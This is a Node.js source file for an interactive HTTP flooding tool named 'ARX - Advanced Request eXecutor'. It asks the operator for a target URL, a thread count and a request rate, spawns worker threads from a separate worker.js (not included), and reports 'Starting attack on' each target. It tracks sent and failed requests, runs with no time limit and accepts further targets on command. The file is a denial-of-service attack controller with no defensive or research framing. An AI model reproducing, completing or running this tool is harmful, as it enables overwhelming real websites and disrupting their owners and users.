const readline = require('readline');
const { Worker } = require('worker_threads');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

console.log("\x1b[36mSelamat datang di ARX - Advanced Request eXecutor (No duration mode)\x1b[0m");

function ask(query) {
  return new Promise(resolve => rl.question(query, answer => resolve(answer.trim())));
}

let targetIndex = 0;
const targets = [];
const workers = [];
const statsMap = new Map();

async function configureAndStartTarget() {
  const url = await ask("\x1b[37mTarget URL: \x1b[0m");
  const threads = parseInt(await ask("\x1b[37mThreads (default 10): \x1b[0m")) || 10;
  const rps = parseInt(await ask("\x1b[37mRPS (default 100): \x1b[0m")) || 100;

  const id = targetIndex++;
  targets.push({ id, url });
  statsMap.set(id, { sent: 0, success: 0, failed: 0 });

  console.log(`\n\x1b[36m[INFO]\x1b[0m Starting attack on \x1b[35m${url}\x1b[0m with \x1b[32m${threads}\x1b[0m threads at \x1b[32m${rps}\x1b[0m RPS.`);

  for (let i = 0; i < threads; i++) {
    const worker = new Worker('./worker.js', {
      workerData: { url, rps: rps / threads, index: id, statsInterval: 1 }
    });

    worker.on('message', msg => {
      if (msg.type === 'stats') {
        const stat = statsMap.get(msg.index);
        stat.sent += msg.sent;
        stat.success += msg.success;
        stat.failed += msg.failed;
        updateStatsDisplay();
      }
    });

    workers.push(worker);
  }
}

function updateStatsDisplay() {
  readline.cursorTo(process.stdout, 0);
  readline.moveCursor(process.stdout, 0, -targets.length);
  for (const t of targets) {
    const s = statsMap.get(t.id);
    process.stdout.write(`\x1b[33m[STATS #${t.id}]\x1b[0m Sent: \x1b[36m${s.sent}\x1b[0m | Success: \x1b[32m${s.success}\x1b[0m | Failed: \x1b[31m${s.failed}\x1b[0m            \n`);
  }
  process.stdout.write("\x1b[32mCommand (next/stop): \x1b[0m");
}

function listenCommands() {
  rl.on('line', async (line) => {
    const cmd = line.trim();
    if (cmd === 'next') {
      await configureAndStartTarget();
    } else if (cmd === 'stop') {
      console.log("\x1b[31m[INFO]\x1b[0m Stopping all workers...");
      for (const w of workers) w.terminate();
      rl.close();
      process.exit(0);
    } else {
      process.stdout.write("\x1b[32mCommand (next/stop): \x1b[0m");
    }
  });
}

(async () => {
  await configureAndStartTarget();
  listenCommands();
})();
